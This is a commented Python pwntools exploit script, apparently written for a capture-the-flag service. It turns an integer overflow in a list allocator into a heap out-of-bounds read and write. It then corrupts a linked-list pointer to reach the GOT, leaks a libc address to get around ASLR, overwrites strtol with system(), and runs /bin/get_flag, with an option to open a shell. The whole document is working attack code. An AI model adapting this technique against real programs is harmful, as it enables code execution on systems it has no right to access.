#!/usr/bin/python3

import pwn
import sys
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13707
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])

#If set to True, the exploit will spawn a shell in interactive mode in addition to printing a flag.
interactive_shell = False

proc=pwn.remote(host,port,fam="ipv4")

#Add a List
proc.write(b"0\n")

#Specify the list size as 0x40000004 in decimal notation:
#  This way the highest bit is not set to not run into the size < 0 check.
#  The second highest bit however is set.
#  After that several bits are 0.
#  Finally one or several of the lower bits are set, determining the actual list size.
#These properties are relevant for the following reason:
#  - The size variable in the list data structure is directly assigned after converting the user 
#    input to an integer. So the list size used to determin bounds during printing/editing is set 
#    to a very large number.
#  - During memory allocation however a wultiplication with 4 occurs before passing the number to 
#    malloc, to account for the size of an integer (4 bytes). However, since the second highest 
#    bit is set, the multiplication with 4 causes an integer overflow, which in turn only leaves 
#    the lower bits of the number. So in our case memory for only 4 integers (4*4 = 16 bytes) is 
#    allocated.
proc.write(b"1073741828\n")

#We can now add another list - the size of which doesn't really matter.
#What is important is, that the second list is allocated on the heap after the first one, but is 
#  placed in the linked list before the first list. So the head pointer is replaced with this new 
#  element, but the next pointer within this new element is set to point to the first one.
proc.write(b"0\n")

#To keep things reasonable we use a small number (0x4) as the list size of the second list.
proc.write(b"4\n")

#If we now were to print stuff we would already be able to leak information.
#Specifically the location of the first list we created on the heap.
#This is due to the bounds check being performed using the maliciously corrupted size variable, 
#  allowing us to read stuff that lies on the heap after our first list.
#Conveniently this includes the next pointer of the list element created second, which points back 
# to the aforementioned list element.
#One such output may look as follows (whitespaces modified for readability):
#    0 0 0 0    0 0 0x31 0    0xc6e6b0 0 0x4 0    0 0 0 0
#The first four zeros (16 bytes) are the actual content of our list, which defaults to 0 as long 
#  as it is not edited. The following 16 bytes are heap management data structures (such as size 
#  information). The 16 bytes after that are the most interesting ones, as they contain the next
#  pointer. Since its a pointer to the heap, the upper bytes are zero in this case. The specific 
#  value here will be different each time. The value after that is the size pointer of the second 
#  list. Afer that the data section of the second list follows.

#Since we will not actually use the loaction of the heap in our exploit but only the fact that we
#  can overwrite the next pointer with some other memory location.
#Also the location of the next pointer of the second node relative to the beginning of our first 
#  one exclusively depends on the list size we selected, so determining offsets also does not 
#  require us to leak any memory for now.
proc.write(b"1\n")

#There are two lists to choose from (0 and 1).
#We choose the second one in the linked list (the one with ID 1), since this is the first one we
#  created and contains a maliciously enlarged size variable.
proc.write(b"1\n")

#This is the offset of the lower part of the next pointer relative to our list node.
#The lower index here is inclusive.
proc.write(b"8\n")

#We only want to edit this one element, so we have to enter 8+1=9, as the upper index is exclusive.
proc.write(b"9\n")

#We now write 0x403708 (in decimal notation: 4208392) to the next pointer, basically removing our 
#  original node from the list and making the list continue in some other memory region.
#Specifically we chose a memory address close to the got.plt section with the following properties:
#  - The eight bytes at the memory address are zero, since those bytes correspond to the next 
#    pointer and we do not want to cause uncontrolled crashes on traversing the list by introducing 
#    a corrupted pointer chain.
#  - The following eight bytes must not be zero and contain a large enough value, so that accessing 
#    the got.plt section will be possible without problems.
#Fortunately an address with those deterministic properties was easy to find using gdb.
proc.write(b"4208392\n")

#Now we can go on to leak memory using the print functionality.
#This time leaking memory is not optional, since we will need to determine the offset of libc, 
#since ASLR is enabled.
proc.write(b"2\n")

#The list with ID 1 now points to memory close to got.plt
proc.write(b"1\n")

#We specifically select offset 6 here, since this is the lower half of a libc address in the got.
#To determine the libc base address any known libc address would do.
#In this case we selected the address of printf.
proc.write(b"6\n")
proc.write(b"7\n")

#Read all the exploit-irrelevant stuff that's been printed until now.
proc.readuntil(b"0x")

#Get the lower end of the address of printf
tmp_str = proc.readline()
libc_printf_addr_lower = int(tmp_str[0:len(tmp_str)-8], 16)
#Use the offsets of 'printf' and 'system' relative to the libc base address, 
#to calculate the address of the system function
libc_printf_offset = 0x53cf0
libc_system_offset = 0x45e50
libc_system_addr_lower = libc_printf_addr_lower - libc_printf_offset + libc_system_offset

#Now it's time to overwrite an appropriate addess in the got with the address of system(...)
#When we take a look at the binary, we can see, that the call to atoi hass been replaced by the 
#  compiler with a call to the libc function strtol.
#Since atoi is simply called on the user input in the selection menu to convert the input to an 
#  integer, it's the perfect candidate to be overwritten with the system address.
#The address lives at offset 18, which corresponds to 0x403760.
proc.write(b"1\n")
proc.write(b"1\n")
proc.write(b"18\n")
proc.write(b"19\n")
proc.write(str(libc_system_addr_lower).encode() + b"\n")

#Now all that is left to do is to write the path to the binary to stdin the next time we're prompted 
#  for user input.
proc.write(b"/bin/get_flag\n")
#Read all the stuff that's printed befor the flag
proc.readuntil(b"flag_")
#Print the flag. Yay!
print("There you go. Wave it!")
print(" >\033[31;1m flag_" + proc.readline().decode() + "\033[0m")
#TADAAA: It's a flag!

#Want a shell as well?
if interactive_shell == True:
    proc.write(b"/bin/sh\n")
    proc.readuntil(b": ")
    print("Here's your shell:")
    proc.interactive()

